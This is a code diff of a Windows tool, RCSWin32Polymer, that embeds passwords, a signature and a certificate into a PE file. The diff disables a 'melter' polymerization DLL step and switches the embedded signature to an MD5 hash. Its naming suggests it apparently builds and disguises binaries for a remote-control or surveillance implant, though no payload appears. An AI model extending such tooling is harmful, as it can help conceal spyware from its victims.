@@ -14,14 +14,14 @@ int _tmain(int argc, _TCHAR* argv[])
 {
 	HMODULE hMelter = NULL;
 	HANDLE hFile;
-	PolymerT fPolymer;
+	// PolymerT fPolymer;
 	CHAR szSignature[256];
 	CHAR szLogPassword[256];
 	CHAR szConfPassword[256];
 	WCHAR wsCertFile[MAX_PATH];
 	WCHAR wsDllFile[MAX_PATH];
 	WCHAR wsOutFile[MAX_PATH];
-
+	
 	if (argc != 7) {
 		printf("ERROR: \n");
 		printf("  usage:  RCSWin32Polymer.exe  <log_pass> <conf_pass> <sig> <cert> <dll> <output>\n\n");
@@ -61,6 +61,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		CloseHandle(hFile);
 	}
 
+#if 0
 	if ((hMelter = LoadLibrary(POLYMERDLL)) == NULL) {
 		printf("Cannot find the melter dll [%S]\n", POLYMERDLL);
 		return ERROR_NO_MELTER;
@@ -70,6 +71,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		printf("Cannot find the function in the melter [%S]\n", POLYFUNC);
 		return ERROR_INVALID_MELTER;
 	}
+#endif
 
 	/************************************************************************/
 	/*  READY TO GO                                                         */
@@ -128,17 +130,21 @@ int _tmain(int argc, _TCHAR* argv[])
 	/* POLYMER                                                              */
 	/************************************************************************/
 
+#if 0
 	try {
 		fPolymer(wsOutFile);
 	} catch (...) {
 		printf("Error while running polymerization\n");
 		DeleteFile(wsOutFile);
 		return ERROR_POLYMER;
-	} 
+	}
+#endif
 		
 	printf("Output file polymerized... ok\n");
 
+#if 0
 	FreeLibrary(hMelter);
+#endif
 
 	return ERROR_SUCCESS;
 }
@@ -255,18 +261,19 @@ int SetASP_Signature(WCHAR * filename, CHAR * signature)
 	BYTE * pBlockPtr	= NULL;
 	BYTE * pDataSect	= NULL;
 	BYTE passwd_b[]		= SIGNATURE_MARK;
+	BYTE pPassMd5[16];
 	unsigned int iLen = 0;
-
+	
 	pBlockPtr = (BYTE *) LoadPE(filename, &iLen);
 	pDataSect = pBlockPtr;
-
+	
 	if( pBlockPtr == NULL )
 		return iRet;
 
 	__try {
 		while(  pBlockPtr < (pDataSect + iLen) ) {
 
-			if( !memcmp(pBlockPtr,passwd_b, sizeof(passwd_b)) )
+			if( !memcmp(pBlockPtr, passwd_b, sizeof(passwd_b)) )
 				break;
 			else
 				pBlockPtr++;
@@ -274,9 +281,10 @@ int SetASP_Signature(WCHAR * filename, CHAR * signature)
 	} __except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION ) {
 		pBlockPtr = NULL;
 	}
-
+	
 	if( pBlockPtr  && (pBlockPtr < ( pDataSect + iLen - SIGNATURE_LEN ) )   ) {
-		memcpy(pBlockPtr, signature, SIGNATURE_LEN);
+		MD5((unsigned char *) signature, (unsigned long) strlen(signature) , (unsigned char *) pPassMd5);
+		memcpy(pBlockPtr, pPassMd5, sizeof(pPassMd5));
 		iRet = true;
 	} else 
 		iRet = false;
